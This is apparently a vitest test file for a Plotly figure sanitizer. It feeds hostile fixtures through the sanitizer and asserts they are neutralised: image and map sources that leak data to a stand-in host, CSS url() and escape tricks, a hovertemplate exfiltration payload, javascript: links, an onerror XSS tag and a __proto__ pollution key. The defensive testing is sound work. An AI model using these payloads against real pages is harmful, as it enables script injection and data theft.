import { describe, expect, it } from 'vitest'
import { sanitizeFigure, sanitizeFigureText } from '../figure'
import { outputsOf } from '../outputs'

/**
 * A figure is drawn by Plotly in the app's page, where an image or a fetch may reach any https host: nothing in one
 * may name a URL Plotly would load, and no markup in its text may load anything (security review, pass 6, finding 1).
 */
const PNG = 'data:image/png;base64,iVBORw0KGgo='

describe('sanitizeFigure', () => {
  it('drops a layout image that names a URL and keeps one carried as a data: image', () => {
    const { layout, dropped } = sanitizeFigure([{ type: 'bar', x: [1], y: [2] }], {
      images: [
        { source: 'https://evil.example/p.png?d=secret', x: 0, y: 0 },
        { source: '//evil.example/p.png', x: 0, y: 0 },
        { source: PNG, x: 0, y: 0 },
      ],
    })
    const images = layout.images as { source?: string }[]
    expect(images.map((i) => i.source)).toEqual([undefined, undefined, PNG])
    expect(dropped).toEqual(expect.arrayContaining(['layout.images[0].source', 'layout.images[1].source']))
  })

  it('drops an image trace’s URL source, keeps a data: one, and its z still draws', () => {
    const { data } = sanitizeFigure([{ type: 'image', source: 'https://evil.example/x.png' }, { type: 'image', source: PNG }, { type: 'image', z: [[[1, 2, 3]]] }], {})
    expect(data[0].source).toBeUndefined()
    expect(data[1].source).toBe(PNG)
    expect(data[2].z).toEqual([[[1, 2, 3]]])
  })

  it('keeps a map’s named style and its own GeoJSON, drops a style URL, a style document, URL layers and the token', () => {
    const geo = { type: 'FeatureCollection', features: [] }
    const { layout } = sanitizeFigure([{ type: 'scattermap', lat: [1], lon: [2] }], {
      map: { style: 'https://evil.example/style.json?d=1', layers: [{ sourcetype: 'raster', source: ['https://evil.example/{z}/{x}/{y}.png'] }, { sourcetype: 'geojson', source: 'https://evil.example/a.geojson' }, { sourcetype: 'geojson', source: geo, type: 'fill' }] },
      mapbox: { style: { version: 8, sources: { s: { type: 'raster', tiles: ['https://evil.example/{z}'] } }, sprite: 'https://evil.example/s' }, accesstoken: 'pk.x' },
      mapbox2: { style: 'carto-positron' },
    })
    const map = layout.map as { style?: unknown; layers: unknown[] }
    expect(map.style).toBeUndefined()
    expect(map.layers).toEqual([{ sourcetype: 'geojson', source: geo, type: 'fill' }])
    expect(layout.mapbox).toEqual({})
    expect((layout.mapbox2 as { style: string }).style).toBe('carto-positron')
  })

  it('finds a URL in a template, and leaves ordinary text and numbers as they are (same objects)', () => {
    const data = [{ type: 'scatter', x: [1, 2, 3], y: [3, 2, 1], text: ['a', 'b', 'https://example.com is text'] }]
    const layout = { title: { text: 'Plain' }, template: { layout: { images: [{ source: 'https://evil.example/t.png' }] } } }
    const clean = sanitizeFigure(data, layout)
    expect(clean.data[0]).toBe(data[0])
    expect(((clean.layout.template as { layout: { images: { source?: string }[] } }).layout.images[0]).source).toBeUndefined()
    expect(clean.layout.title).toBe(layout.title)
  })

  it('takes keys that walk the prototype out', () => {
    const layout = JSON.parse('{"__proto__": {"polluted": 1}, "constructor": {"x": 1}, "title": "t"}')
    const clean = sanitizeFigure([{ type: 'bar' }], layout)
    expect(Object.keys(clean.layout)).toEqual(['title'])
  })
})

describe('sanitizeFigureText', () => {
  it('keeps the markup Plotly draws and only safe style', () => {
    expect(sanitizeFigureText('<b>bold</b><br><i>it</i>')).toBe('<b>bold</b><br><i>it</i>')
    expect(sanitizeFigureText('<span style="color:rgb(1,2,3);font-size:12px">x</span>')).toBe('<span style="color:rgb(1,2,3);font-size:12px">x</span>')
  })
  it('takes every way to load a URL out of a style', () => {
    for (const css of ['filter:url(https://e.example/f.svg#f)', 'cursor:url(https://e.example/c.png),auto', 'color:red;background:\\75 rl(https://e.example)', 'color:image-set("https://e.example/i.png" 1x)', 'mask:u\\rl(https://e.example)']) {
      const out = sanitizeFigureText(`<span style="${css}">x</span>`)
      expect(out, css).not.toMatch(/url|image-set|\\|e\.example/i)
    }
  })
  it('keeps placeholders out of tags, so a template cannot be finished by its data', () => {
    expect(sanitizeFigureText('<span style="color:%{customdata}">x</span>')).toBe('&lt;span style="color:%{customdata}">x</span>')
    expect(sanitizeFigureText('<span sty%{customdata}>x')).toBe('&lt;span sty%{customdata}>x')
    // Half a tag in the data is shown as text, never parsed.
    expect(sanitizeFigureText('le="filter:url(https://e.example)">')).toBe('le="filter:url(https://e.example)">')
    expect(sanitizeFigureText('<span style="filter:ur')).toBe('&lt;span style="filter:ur')
  })
  it('keeps links to http(s) only, with no other attributes', () => {
    expect(sanitizeFigureText('<a href="https://ok.example/p" target="_self" popup="x">l</a>')).toBe('<a href="https://ok.example/p">l</a>')
    expect(sanitizeFigureText('<a href="javascript:alert(1)">l</a>')).toBe('<a>l</a>')
    expect(sanitizeFigureText('<img src=x onerror=alert(1)>')).toBe('&lt;img src=x onerror=alert(1)>')
  })
})

describe('outputsOf cleans a script’s figure', () => {
  it('the figure a script returns never carries a URL Plotly would fetch', () => {
    const [fig] = outputsOf({ plot: { data: [{ type: 'bar', x: [1], y: [1], hovertemplate: '<span style="filter:url(https://e.example/?d=%{x})">%{y}</span>' }], layout: { images: [{ source: 'https://e.example/?d=secret' }] } } })
    expect(fig.kind).toBe('figure')
    if (fig.kind !== 'figure') return
    expect((fig.layout.images as { source?: string }[])[0].source).toBeUndefined()
    // The template's tag is shown as text (`&lt;span …`), never parsed as a span with a style.
    expect(String(fig.data[0].hovertemplate)).toMatch(/^&lt;span/)
  })
})
